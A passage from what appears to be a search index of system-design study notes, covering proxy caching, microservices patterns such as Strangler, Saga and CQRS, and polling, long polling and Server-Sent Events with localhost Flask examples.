Purpose-built for this, best performance</p> <p>For API Responses (Same Region): - Use Reverse Proxy - Nginx, Varnish, built-in app cache</p> <p>For Corporate Outbound Traffic: - Use Forward Proxy - Squid, cache downloads and updates</p> <p>For Dynamic Content: - Application-level caching - Redis, Memcached - Reverse proxy for rendered output</p> <p>Don't Use for Caching: - Load balancers (use CDN/reverse proxy instead) - VPN (wrong purpose, encrypted traffic) - Firewalls (security focus, not performance)</p>"},{"location":"system-design/high-level/concepts/microservices-patterns/","title":"Microservices patterns","text":""},{"location":"system-design/high-level/concepts/microservices-patterns/#youtube","title":"Youtube","text":"<ul> <li>3. Microservices Design Patterns | Part1: Introduction and Decomposition Pattern | HLD</li> <li>4. SAGA Pattern | Strangler Pattern | CQRS | Microservices Design Patterns | System Design</li> <li> <p>In How many Microservices we should divide Monolithic System | How Many Microservices are too many?</p> </li> <li> <p>Rate Limiter: Fault Tolerance in Distributed Microservices | Rate Limiter Implementation</p> </li> <li>Bulkhead Pattern: Fault Tolerance in Distributed Microservices</li> <li>Retry Pattern: Fault Tolerance in Distributed Microservices</li> <li>Circuit Breaker : Fault Tolerance in Distributed Microservices</li> </ul>"},{"location":"system-design/high-level/concepts/microservices-patterns/#theory","title":"Theory","text":""},{"location":"system-design/high-level/concepts/microservices-patterns/#introduction-part-1","title":"Introduction - Part 1","text":"<ul> <li>This is part 3 of the video series on high-level design.</li> <li>The previous two videos have already covered earlier topics.</li> <li>This part covers:<ul> <li>Monolithic vs. microservices architectures</li> <li>Key microservices patterns</li> <li>Notes that this topic can lead to around 15 interview questions</li> </ul> </li> </ul>"},{"location":"system-design/high-level/concepts/microservices-patterns/#disadvantages-of-monolithic-architecture","title":"Disadvantages of Monolithic Architecture","text":"<ul> <li>Tight Coupling<ul> <li>Changing one line can impact other components.</li> <li>Requires testing and deploying the entire application for a single change.</li> </ul> </li> <li>Difficult to Scale<ul> <li>Scaling one component requires scaling the entire application.</li> </ul> </li> <li>Expensive Deployments and Rollbacks<ul> <li>Redeployment of the whole application is needed for small changes.</li> </ul> </li> <li>Large Codebase<ul> <li>All code resides in a single application.</li> <li>The codebase grows large over time, making changes and impact analysis difficult.</li> </ul> </li> </ul>"},{"location":"system-design/high-level/concepts/microservices-patterns/#why-microservices","title":"Why Microservices?","text":"<ul> <li>Designed to overcome the disadvantages of monolithic architectures.</li> <li>Splits a large application into smaller, independent services.</li> </ul>"},{"location":"system-design/high-level/concepts/microservices-patterns/#advantages-of-microservices","title":"Advantages of Microservices","text":"<ul> <li>Better separation of concerns</li> <li>Loose coupling between services</li> <li>Independent deployment of services</li> <li>Easier to scale specific services</li> <li>Faster release cycles</li> </ul>"},{"location":"system-design/high-level/concepts/microservices-patterns/#disadvantages-of-microservices","title":"Disadvantages of Microservices","text":"<ul> <li>Defining proper service boundaries and decomposition is challenging.</li> <li>Inter-service communication is complex:<ul> <li>Requires monitoring calls across services</li> <li>Needs robust failure handling</li> </ul> </li> <li>Distributed transaction management is difficult, especially across multiple databases.</li> </ul>"},{"location":"system-design/high-level/concepts/microservices-patterns/#microservices-design-phases","title":"Microservices Design Phases","text":"<ul> <li>Decomposition patterns</li> <li>Database patterns</li> <li>Communication patterns</li> <li>Integration patterns</li> <li>Deployment patterns</li> <li>Cross-cutting concerns (e.g., monitoring, logging)</li> </ul>"},{"location":"system-design/high-level/concepts/microservices-patterns/#decomposition-patterns","title":"Decomposition Patterns","text":"<ul> <li>By Business Capability<ul> <li>Split based on business functions (e.g., order management, inventory).</li> </ul> </li> <li>By Subdomain (Domain-Driven Design)<ul> <li>Divide large domains into multiple services (e.g., splitting the payment domain).</li> </ul> </li> </ul>"},{"location":"system-design/high-level/concepts/microservices-patterns/#introduction-part-2","title":"Introduction - Part 2","text":"<ul> <li>This video continues from Part 1, which discussed the \"Decompose by Medium Position Pattern\".</li> <li>Focuses on three important patterns:<ul> <li>Strangler Pattern: Used for refactoring a monolithic service into microservices.</li> <li>Saga Pattern: Addresses distributed transactions across multiple databases.</li> <li>CQRS (Command Query Responsibility Segregation): Separates command (write) and query (read) operations for improved performance and scalability.</li> </ul> </li> </ul>"},{"location":"system-design/high-level/concepts/microservices-patterns/#strangler-pattern","title":"Strangler Pattern","text":"<ul> <li>Purpose: Gradually refactor a monolithic application into microservices.</li> <li>How it Works:<ul> <li>Introduce a controller to handle incoming requests.</li> <li>Initially, the controller forwards all traffic to the monolithic application.</li> <li>Gradually extract specific functionalities into microservices, updating the controller to route relevant traffic.</li> <li>Over time, more traffic is routed to microservices, reducing reliance on the monolith.</li> </ul> </li> <li>Advantages:<ul> <li>Minimizes disruption to existing services.</li> <li>Enables a gradual transition to microservices.</li> </ul> </li> <li>Example:<ul> <li>In an e-commerce website, the controller initially directs all traffic to the monolith.</li> <li>Gradually, functionalities like order placement, inventory management, and payment processing are moved to microservices.</li> <li>The controller routes more traffic to these microservices, eventually phasing out the monolith.</li> </ul> </li> </ul>"},{"location":"system-design/high-level/concepts/microservices-patterns/#data-management-in-microservices","title":"Data Management in Microservices","text":"<ul> <li>Two Approaches:<ul> <li>Database per Service: Each microservice has its own dedicated database, promoting autonomy and isolation.</li> <li>Shared Database: All microservices share a single database, simplifying data access but introducing complexities.</li> </ul> </li> <li>Why Database per Service is Preferred:<ul> <li>Scalability: Enables independent scaling of services.</li> <li>Isolation: Changes in one service's database do not affect others.</li> <li>Technology Flexibility: Each service can choose the most suitable database technology.</li> </ul> </li> <li>Advantages of Shared Database:<ul> <li>Easier to perform join queries</li> <li>Supports transactional (ACID) properties</li> </ul> </li> <li>Drawbacks of Shared Database:<ul> <li>Performance bottlenecks due to increased contention</li> <li>Complexity in managing dependencies and consistency</li> <li>Limited scalability, as the entire database must be scaled even if only one service needs more resources</li> </ul> </li> </ul>"},{"location":"system-design/high-level/concepts/microservices-patterns/#saga-pattern","title":"Saga Pattern","text":"<ul> <li>Purpose: Manage distributed transactions across multiple databases, ensuring data consistency even if some operations fail.</li> <li>How it Works:<ul> <li>A sequence of local transactions is executed within each participating microservice.</li> <li>Each transaction updates its database and publishes an event.</li> <li>Subsequent transactions listen for these events and proceed accordingly.</li> <li>In case of failure, compensation events are published to undo completed operations and maintain consistency.</li> </ul> </li> <li>Types of Sagas:<ul> <li>Choreography: Each service manages its own transactions and listens to events from other services.</li> <li>Orchestration: A centralized orchestrator manages the transaction flow and compensation logic.</li> </ul> </li> <li>Example:<ul> <li>An order processing saga involving order creation, inventory management, and payment processing services.</li> <li>If the payment service fails, compensation events are triggered to cancel the order and update inventory.</li> </ul> </li> <li>Advantages:<ul> <li>Ensures data consistency in distributed systems.</li> <li>Provides mechanisms for handling failures and rollbacks.</li> <li>Allows flexibility in service interactions.</li> </ul> </li> <li>Disadvantages:<ul> <li>Increased complexity compared to local transactions.</li> <li>Requires careful design and implementation.</li> </ul> </li> <li>Interview Question Example:<ul> <li>How would you handle a transaction involving transferring money between two users in a microservices architecture?</li> </ul> </li> </ul>"},{"location":"system-design/high-level/concepts/microservices-patterns/#cqrs-pattern","title":"CQRS Pattern","text":"<ul> <li>Purpose: Separate read (query) operations from write (command) operations for better performance and scalability.</li> <li>How it Works:<ul> <li>The system maintains separate models for read and write operations.</li> <li>Write operations are performed through commands, updating the write model.</li> <li>Read operations access the read model, which is optimized for fast retrieval.</li> </ul> </li> <li>Advantages:<ul> <li>Performance: Optimized read models handle queries efficiently.</li> <li>Scalability: Read and write models can be scaled independently.</li> <li>Flexibility: Allows different data structures and query languages for reads and writes.</li> </ul> </li> <li>Example:<ul> <li>In a blog application, write operations use a relational database, while read operations access a denormalized view optimized for fast search.</li> </ul> </li> <li>Challenges:<ul> <li>Maintaining consistency between the read and write models.</li> <li>Ensuring the read model is up-to-date with changes in the write model.</li> </ul> </li> </ul>"},{"location":"system-design/high-level/concepts/networking/","title":"Networking","text":""},{"location":"system-design/high-level/concepts/networking/#youtube","title":"Youtube","text":"<ul> <li>1. Network Protocols (Hindi), High Level Design | Client Server vs P2P Model | webSocket vs WebRTC</li> <li>Network Protocols (English Dubbed) | Better with 1.25x playback speed</li> <li>WebSockets vs Polling vs Server Sent Events</li> <li>Webhooks for Beginners - From Polling to Real\u2011Time Events</li> </ul>"},{"location":"system-design/high-level/concepts/networking/#theory","title":"Theory","text":""},{"location":"system-design/high-level/concepts/networking/#websockets-vs-polling-vs-server-sent-events","title":"WebSockets vs Polling vs Server-Sent Events","text":"<p>These are three different approaches for real-time client-server communication, each with different characteristics and use cases.</p>"},{"location":"system-design/high-level/concepts/networking/#1-polling-short-polling","title":"1. Polling (Short Polling)","text":""},{"location":"system-design/high-level/concepts/networking/#description","title":"Description","text":"<p>The client repeatedly sends HTTP requests to the server at regular intervals to check for new data, regardless of whether data is available.</p>"},{"location":"system-design/high-level/concepts/networking/#how-it-works","title":"How It Works","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Client  \u2502                                           \u2502 Server  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518                                           \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                      \u2502\n     \u2502  Request: \"Any updates?\"                            \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                      \u2502\n     \u2502  Response: \"No data\" (Empty)                        \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                                      \u2502\n     \u2502  \u23f1\ufe0f Wait (e.g., 5 seconds)                          \u2502\n     \u2502                                                      \u2502\n     \u2502  Request: \"Any updates?\"                            \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                      \u2502\n     \u2502  Response: \"No data\" (Empty)                        \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                                      \u2502\n     \u2502  \u23f1\ufe0f Wait (e.g., 5 seconds)                          \u2502\n     \u2502                                                      \u2502\n     \u2502  Request: \"Any updates?\"                            \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                      \u2502\n     \u2502  Response: \"Here's data!\" \u2705                        \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                                      \u2502\n     \u2502  \u23f1\ufe0f Wait (e.g., 5 seconds)                          \u2502\n     \u2502                                                      \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n     Process repeats indefinitely...\n</code></pre>"},{"location":"system-design/high-level/concepts/networking/#python-implementation","title":"Python Implementation","text":"<p>Server (Flask): <pre><code>from flask import Flask, jsonify\nfrom datetime import datetime\nimport random\n\napp = Flask(__name__)\n\n# Simulated data store\nmessages = []\n\n@app.route('/poll', methods=['GET'])\ndef poll():\n    \"\"\"Short polling endpoint\"\"\"\n    # Return any new messages\n    if messages:\n        data = messages.copy()\n        messages.clear()\n        return jsonify({\n            'timestamp': datetime.now().isoformat(),\n            'messages': data\n        }), 200\n    else:\n        return jsonify({\n            'timestamp': datetime.now().isoformat(),\n            'messages': []\n        }), 200\n\n@app.route('/send', methods=['POST'])\ndef send_message():\n    \"\"\"Endpoint to add messages\"\"\"\n    from flask import request\n    message = request.json.get('message')\n    messages.append(message)\n    return jsonify({'status': 'received'}), 200\n\nif __name__ == '__main__':\n    app.run(port=5000, debug=True)\n</code></pre></p> <p>Client: <pre><code>import requests\nimport time\n\nSERVER_URL = \"http://localhost:5000\"\nPOLL_INTERVAL = 5  # seconds\n\ndef poll_server():\n    \"\"\"Client polling implementation\"\"\"\n    print(\"Starting polling client...\")\n    request_count = 0\n\n    while True:\n        try:\n            request_count += 1\n            print(f\"\\n[Request #{request_count}] Polling server...\")\n\n            response = requests.get(f\"{SERVER_URL}/poll\", timeout=10)\n            data = response.json()\n\n            if data['messages']:\n                print(f\"\u2705 Received data: {data['messages']}\")\n            else:\n                print(\"\u274c No new data\")\n\n            # Wait before next poll\n            time.sleep(POLL_INTERVAL)\n\n        except requests.exceptions.RequestException as e:\n            print(f\"Error: {e}\")\n            time.sleep(POLL_INTERVAL)\n\nif __name__ == '__main__':\n    poll_server()\n</code></pre></p>"},{"location":"system-design/high-level/concepts/networking/#advantages","title":"Advantages","text":"<ol> <li>\u2705 Simple to implement - Uses standard HTTP requests</li> <li>\u2705 Stateless - No connection state to maintain</li> <li>\u2705 Works everywhere - Compatible with all browsers and proxies</li> <li>\u2705 Firewall friendly - Standard HTTP traffic</li> <li>\u2705 Easy to debug - Can test with curl or browser</li> </ol>"},{"location":"system-design/high-level/concepts/networking/#disadvantages","title":"Disadvantages","text":"<ol> <li>\u274c High latency - Updates delayed by polling interval</li> <li>\u274c Resource wasteful - Many empty requests when no data</li> <li>\u274c Server load - Continuous requests even without updates</li> <li>\u274c Network overhead - Full HTTP headers on every request</li> <li>\u274c Battery drain - Constant requests on mobile devices</li> <li>\u274c Not real-time - Gap between data availability and delivery</li> </ol>"},{"location":"system-design/high-level/concepts/networking/#2-long-polling","title":"2. Long Polling","text":""},{"location":"system-design/high-level/concepts/networking/#description_1","title":"Description","text":"<p>The client sends a request to the server, and the server holds the request open until new data is available or a timeout occurs. Once data is sent or timeout happens, the client immediately makes another request.</p>"},{"location":"system-design/high-level/concepts/networking/#how-it-works_1","title":"How It Works","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Client  \u2502                                           \u2502 Server  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518                                           \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                      \u2502\n     \u2502  Request: \"Any updates?\" (Connection held open)     \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                      \u2502\n     \u2502                    \u23f1\ufe0f Server waits...               \u2502\n     \u2502                    (holding connection)              \u2502\n     \u2502                    No data yet...                    \u2502\n     \u2502                    Still waiting...                  \u2502\n     \u2502                                                      \u2502\n     \u2502                    \ud83d\udcec New data arrives!              \u2502\n     \u2502  Response: \"Here's data!\" \u2705                        \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                                      \u2502\n     \u2502  Immediately reconnect                               \u2502\n     \u2502  Request: \"Any updates?\" (Connection held open)     \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                      \u2502\n     \u2502                    \u23f1\ufe0f Server waits...               \u2502\n     \u2502                    (holding connection)              \u2502\n     \u2502                    No data yet...                    \u2502\n     \u2502                                                      \u2502\n     \u2502                    \u23f0 Timeout (e.g., 30s)            \u2502\n     \u2502  Response: \"No data\" (Timeout)                      \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                                      \u2502\n     \u2502  Immediately reconnect                               \u2502\n     \u2502  Request: \"Any updates?\"                            \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                      \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/networking/#python-implementation_1","title":"Python Implementation","text":"<p>Server (Flask with Threading): <pre><code>from flask import Flask, jsonify, request\nfrom datetime import datetime\nimport time\nimport threading\nfrom queue import Queue, Empty\n\napp = Flask(__name__)\n\n# Queue for each client\nclient_queues = {}\nqueue_lock = threading.Lock()\n\n@app.route('/long-poll', methods=['GET'])\ndef long_poll():\n    \"\"\"Long polling endpoint\"\"\"\n    client_id = request.args.get('client_id', 'default')\n    timeout = 30  # seconds\n\n    # Create queue for this client if doesn't exist\n    with queue_lock:\n        if client_id not in client_queues:\n            client_queues[client_id] = Queue()\n\n    queue = client_queues[client_id]\n\n    try:\n        # Wait for data with timeout\n        data = queue.get(timeout=timeout)\n        return jsonify({\n            'timestamp': datetime.now().isoformat(),\n            'message': data,\n            'status': 'data'\n        }), 200\n    except Empty:\n        # Timeout - no data available\n        return jsonify({\n            'timestamp': datetime.now().isoformat(),\n            'message': None,\n            'status': 'timeout'\n        }), 200\n\n@app.route('/broadcast', methods=['POST'])\ndef broadcast():\n    \"\"\"Broadcast message to all connected clients\"\"\"\n    message = request.json.get('message')\n\n    with queue_lock:\n        for queue in client_queues.values():\n            queue.put(message)\n\n    return jsonify({\n        'status': 'broadcasted',\n        'clients': len(client_queues)\n    }), 200\n\nif __name__ == '__main__':\n    app.run(port=5001, debug=True, threaded=True)\n</code></pre></p> <p>Client: <pre><code>import requests\nimport time\nimport uuid\n\nSERVER_URL = \"http://localhost:5001\"\nCLIENT_ID = str(uuid.uuid4())\n\ndef long_poll_client():\n    \"\"\"Client long polling implementation\"\"\"\n    print(f\"Starting long polling client (ID: {CLIENT_ID})...\")\n    request_count = 0\n\n    while True:\n        try:\n            request_count += 1\n            print(f\"\\n[Request #{request_count}] Long polling server...\")\n\n            # Long polling request (will wait on server)\n            response = requests.get(\n                f\"{SERVER_URL}/long-poll\",\n                params={'client_id': CLIENT_ID},\n                timeout=35  # Slightly longer than server timeout\n            )\n\n            data = response.json()\n\n            if data['status'] == 'data':\n                print(f\"\u2705 Received data: {data['message']}\")\n            elif data['status'] == 'timeout':\n                print(\"\u23f0 Request timed out, reconnecting...\")\n\n            # Immediately reconnect (no delay)\n\n        except requests.exceptions.RequestException as e:\n            print(f\"Error: {e}\")\n            time.sleep(5)  # Wait before retry on error\n\nif __name__ == '__main__':\n    long_poll_client()\n</code></pre></p>"},{"location":"system-design/high-level/concepts/networking/#advantages_1","title":"Advantages","text":"<ol> <li>\u2705 Near real-time - Minimal delay when data arrives</li> <li>\u2705 Reduced requests - Only reconnects when data received or timeout</li> <li>\u2705 Lower server load - Fewer requests than short polling</li> <li>\u2705 Works with proxies - Standard HTTP</li> <li>\u2705 Better than short polling - More efficient resource usage</li> </ol>"},{"location":"system-design/high-level/concepts/networking/#disadvantages_1","title":"Disadvantages","text":"<ol> <li>\u274c Server resources - Holds connections open (threads/memory)</li> <li>\u274c Scalability issues - Limited concurrent connections per server</li> <li>\u274c Complex implementation - Requires threading/async on server</li> <li>\u274c Timeout management - Need to handle connection timeouts</li> <li>\u274c Still HTTP overhead - Full headers on each request/response</li> <li>\u274c Not bidirectional - Only server-to-client push</li> </ol>"},{"location":"system-design/high-level/concepts/networking/#3-server-sent-events-sse","title":"3. Server-Sent Events (SSE)","text":""},{"location":"system-design/high-level/concepts/networking/#description_2","title":"Description","text":"<p>A unidirectional channel from server to client over a single HTTP connection. The server can push data to the client whenever new data is available. Client only listens.</p>"},{"location":"system-design/high-level/concepts/networking/#how-it-works_2","title":"How It Works","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Client  \u2502                                           \u2502 Server  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518                                           \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                      \u2502\n     \u2502  Initial Request: \"Open SSE connection\"             \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                                      \u2502\n     \u2502  Response: HTTP 200 OK                              \u2502\n     \u2502  Content-Type: text/event-stream                    \u2502\n     \u2502  Connection: keep-alive                             \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                                      \u2502\n     \u2502\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2502\n     \u2502         \ud83d\udd0c Connection Stays Open                    \u2502\n     \u2502\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2502\n     \u2502                                                      \u2502\n     \u2502                    \ud83d\udcec Event 1 arrives                \u2502\n     \u2502  \u2b05\ufe0f data: {\"message\": \"Hello\"}                     \u2502\n     \u2502&lt;\u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2524\n     \u2502                                                      \u2502\n     \u2502  Client processes event                              \u2502\n     \u2502                                                      \u2502\n     \u2502                    \ud83d\udcec Event 2 arrives                \u2502\n     \u2502  \u2b05\ufe0f data: {\"message\": \"World\"}                     \u2502\n     \u2502&lt;\u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2524\n     \u2502                                                      \u2502\n     \u2502  Client processes event                              \u2502\n     \u2502                                                      \u2502\n     \u2502                    \ud83d\udcec Event 3 arrives                \u2502\n     \u2502  \u2b05\ufe0f data: {\"message\": \"Goodbye\"}                   \u2502\n     \u2502&lt;\u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2524\n     \u2502                                                      \u2502\n     \u2502\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2502\n     \u2502     Connection remains open for more events         \u2502\n     \u2502\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2502\n     \u2502                                                      \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/networking/#sse-event-format","title":"SSE Event Format","text":"<pre><code>event: message\nid: 1\nretry: 10000\ndata: {\"user\": \"John\", \"text\": \"Hello!\"}\n\nevent: notification\nid: 2\ndata: {\"type\": \"alert\", \"message\": \"New update\"}\n\nevent: heartbeat\ndata: 